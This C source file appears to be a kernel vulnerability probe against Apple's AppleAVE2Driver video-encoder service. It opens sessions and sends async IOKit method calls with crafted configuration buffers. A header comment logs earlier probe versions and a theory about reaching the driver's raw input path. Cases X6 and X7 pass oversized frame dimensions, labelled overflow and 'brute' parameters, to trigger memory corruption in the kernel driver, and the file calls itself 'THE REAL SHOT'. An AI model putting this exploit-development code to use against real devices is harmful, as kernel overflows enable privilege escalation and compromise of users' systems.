/*
 * ave2_probe_create.c v19 — async configure (THE REAL SHOT)
 *
 * v18: sel3 ASYNC (wake port + asyncRef) -> KERN_SUCCESS, out written
 * ("904.76.7" echo). After it, sync sel5/sel6 changed d9 -> 0xe0000001
 * (translate(-1015)) — the UC state advanced. sel4 sync stays bc (out
 * untouched). Working theory: AVE2 commands are ASYNC methods; the async
 * path delivers the OOL input as a raw pointer so the handler takes the
 * RAW path -> checker -> AVE session -> out written.
 *
 * X1 create -> sel3 async -> sel4 ASYNC (OOL 0x1a0a0, legal cfg)
 * X2 create -> sel4 ASYNC (no sel3)
 * X3 create -> sel3 async -> sel4 sync (control, expect bc)
 * X4 create -> sel3 async -> sel5 ASYNC
 * X5 create -> sel3 async -> sel6 ASYNC
 * X6 create -> sel3 async -> sel4 ASYNC with LRB overflow params
 *    (65424x5264 p6=3 — the upstream brute pair)
 * X7 create -> sel3 async -> sel4 ASYNC with 64656x8080 p6=3
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <mach/mach.h>

#include "iokit_dyn.h"
#include "ave2_wire.h"

static const char *krname(kern_return_t k) {
    switch (k) {
    case 0:              return "KERN_SUCCESS";
    case 0xe00002c2u:    return "c2";
    case 0xe00002c7u:    return "c7";
    case 0xe00002bcu:    return "0xbc";
    case 0xe00002d8u:    return "0xd8";
    case 0xe00002d9u:    return "0xd9";
    case 0xe0000001u:    return "0xe0000001";
    default:             return "";
    }
}

static void dump_out(const uint8_t *out, size_t osz, size_t n) {
    size_t m = osz < n ? osz : n;
    int allz = 1;
    for (size_t q = 0; q < osz; q++) if (out[q]) { allz = 0; break; }
    printf("    osz=%zu allzero=%d out:", osz, allz);
    for (size_t q = 0; q < m; q++) printf("%02x", out[q]);
    printf("\n");
}

static uint8_t  cin[0x1a0c0];
static uint8_t  in[0x6f0];
static uint8_t  out[0x400];
static uint64_t counter = 0x0000700000001000ULL;

static mach_port_t wake;
static io_service_t svc;

static kern_return_t create_session(io_service_t svc, io_connect_t *conn) {
    *conn = MACH_PORT_NULL;
    kern_return_t kr = p_IOServiceOpen(svc, mach_task_self(), 1, conn);
    if (kr != 0) { printf("    open fail 0x%08x\n", kr); return kr; }
    memset(in, 0, AVE2_IOS_CREATE_IN_SIZE);
    *(uint64_t *)(in + 0x08) = 0x4142434445464748ULL;
    *(uint64_t *)(in + 0x10) = 0x3132333435363738ULL;
    memcpy(in + AVE2_IOS_CREATE_OFF_VERSION, "904.76.7", 8);
    *(uint64_t *)(in + AVE2_IOS_CREATE_OFF_LOGCNT) = ++counter;
    *(int32_t *)(in + AVE2_IOS_CREATE_OFF_LOGLVL) = 1;
    *(int32_t *)(in + AVE2_IOS_CREATE_OFF_LOGNUM) = 1;
    *(int32_t *)(in + AVE2_IOS_CREATE_OFF_MODE)   = 1;
    size_t osz = AVE2_IOS_CREATE_OUT_SIZE;
    memset(out, 0, sizeof(out));
    kern_return_t k1 = p_IOConnectCallStructMethod(*conn, 1, in, AVE2_IOS_CREATE_IN_SIZE, out, &osz);
    printf("    create -> 0x%08x\n", k1);
    return k1;
}

static void destroy_close(io_connect_t c) {
    uint8_t din[0x28] = {0}; size_t o = 0x20; memset(out, 0, sizeof(out));
    kern_return_t kr = p_IOConnectCallStructMethod(c, 2, din, 0x28, out, &o);
    printf("    destroy -> 0x%08x\n", kr);
    p_IOServiceClose(c);
}

static kern_return_t sel3_async(io_connect_t c) {
    uint8_t din[0x40];
    memset(din, 0, sizeof(din));
    memcpy(din, "904.76.7", 8);
    iodyn_async_ref_t aref; memset(aref, 0, sizeof(aref));
    aref[0] = 0x1;
    memset(out, 0xAA, sizeof(out));
    size_t o = 0x20;
    kern_return_t kr = p_IOConnectCallAsyncStructMethod(c, 3, wake, aref, 8, din, 0x38, out, &o);
    printf("    sel3 async -> 0x%08x %s\n", kr, krname(kr)); dump_out(out, o, 0x20);
    return kr;
}

static void fill_cfg(int w, int h, int p6) {
    memset(cin, 0, sizeof(cin));
    memcpy(cin + 0x00, "904.76.7", 8);
    memcpy(cin + 0x28, "904.76.7", 8);
    *(int32_t *)(cin + AVE2_OFF_WIDTH)     = w;
    *(int32_t *)(cin + AVE2_OFF_HEIGHT)    = h;
    *(int32_t *)(cin + AVE2_MODE5_OFF_P6)  = p6;
    *(int32_t *)(cin + AVE2_MODE5_OFF_P8)  = 10;
}

/* sel4 ASYNC: OOL input + wake port */
static kern_return_t sel4_async(int w, int h, int p6) {
    io_connect_t c;
    if (create_session(svc, &c) != 0) return -1;
    if (sel3_async(c) != 0) { destroy_close(c); return -1; }
    fill_cfg(w, h, p6);
    iodyn_async_ref_t aref; memset(aref, 0, sizeof(aref));
    aref[0] = 0x2;
    memset(out, 0xAA, sizeof(out));
    size_t o = 0x20;
    kern_return_t kr = p_IOConnectCallAsyncStructMethod(c, 4, wake, aref, 8, cin, 0x1a0a0, out, &o);
    printf("    sel4 async (%dx%d p6=%d) -> 0x%08x %s\n", w, h, p6, kr, krname(kr));
    dump_out(out, o, 0x24);
    destroy_close(c);
    return kr;
}

int main(void) {
    setvbuf(stdout, NULL, _IONBF, 0);
    if (iodyn_init() != 0) { printf("[-] iodyn\n"); return 3; }
    void *m = p_IOServiceMatching("AppleAVE2Driver");
    svc = p_IOServiceGetMatchingService(IODYN_MAIN_PORT, m);
    if (!svc) { printf("[-] no service\n"); return 1; }
    const char *e = getenv("AVE2_LOGCNT");
    if (e != NULL && e[0]) counter = strtoull(e, NULL, 0);
    kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &wake);
    if (kr != 0) { printf("[-] port alloc\n"); return 5; }
    io_connect_t c;

    printf("\n=== X1 create -> sel3 async -> sel4 ASYNC legal 1920x1080 p6=2 ===\n");
    if (create_session(svc, &c) == 0) {
        sel3_async(c);
        fill_cfg(1920, 1080, 2);
        iodyn_async_ref_t aref; memset(aref, 0, sizeof(aref)); aref[0] = 0x2;
        memset(out, 0xAA, sizeof(out));
        size_t o = 0x20;
        kr = p_IOConnectCallAsyncStructMethod(c, 4, wake, aref, 8, cin, 0x1a0a0, out, &o);
        printf("    sel4 async -> 0x%08x %s\n", kr, krname(kr)); dump_out(out, o, 0x24);
        destroy_close(c);
    }

    printf("\n=== X2 create -> sel4 ASYNC (no sel3) ===\n");
    if (create_session(svc, &c) == 0) {
        fill_cfg(1920, 1080, 2);
        iodyn_async_ref_t aref; memset(aref, 0, sizeof(aref)); aref[0] = 0x2;
        memset(out, 0xAA, sizeof(out));
        size_t o = 0x20;
        kr = p_IOConnectCallAsyncStructMethod(c, 4, wake, aref, 8, cin, 0x1a0a0, out, &o);
        printf("    sel4 async -> 0x%08x %s\n", kr, krname(kr)); dump_out(out, o, 0x24);
        destroy_close(c);
    }

    printf("\n=== X3 create -> sel3 async -> sel4 sync (control) ===\n");
    if (create_session(svc, &c) == 0) {
        sel3_async(c);
        fill_cfg(1920, 1080, 2);
        memset(out, 0xAA, sizeof(out));
        size_t o = 0x20;
        kr = p_IOConnectCallStructMethod(c, 4, cin, 0x1a0a0, out, &o);
        printf("    sel4 sync -> 0x%08x %s\n", kr, krname(kr)); dump_out(out, o, 0x24);
        destroy_close(c);
    }

    printf("\n=== X4 create -> sel3 async -> sel5 ASYNC ===\n");
    if (create_session(svc, &c) == 0) {
        sel3_async(c);
        fill_cfg(1920, 1080, 2);
        iodyn_async_ref_t aref; memset(aref, 0, sizeof(aref)); aref[0] = 0x3;
        memset(out, 0xAA, sizeof(out));
        size_t o = 0x150;
        kr = p_IOConnectCallAsyncStructMethod(c, 5, wake, aref, 8, cin, 0x1a0b0, out, &o);
        printf("    sel5 async -> 0x%08x %s\n", kr, krname(kr)); dump_out(out, o, 0x24);
        destroy_close(c);
    }

    printf("\n=== X5 create -> sel3 async -> sel6 ASYNC ===\n");
    if (create_session(svc, &c) == 0) {
        sel3_async(c);
        uint8_t din[0x40]; memset(din, 0, sizeof(din)); memcpy(din, "904.76.7", 8);
        iodyn_async_ref_t aref; memset(aref, 0, sizeof(aref)); aref[0] = 0x4;
        memset(out, 0xAA, sizeof(out));
        size_t o = 0x20;
        kr = p_IOConnectCallAsyncStructMethod(c, 6, wake, aref, 8, din, 0x30, out, &o);
        printf("    sel6 async -> 0x%08x %s\n", kr, krname(kr)); dump_out(out, o, 0x24);
        destroy_close(c);
    }

    printf("\n=== X6 sel3 -> sel4 ASYNC LRB brute 65424x5264 p6=3 ===\n");
    sel4_async(65424, 5264, 3);

    printf("\n=== X7 sel3 -> sel4 ASYNC overflow 64656x8080 p6=3 ===\n");
    sel4_async(64656, 8080, 3);

    p_IOObjectRelease(svc);
    return 42;
}
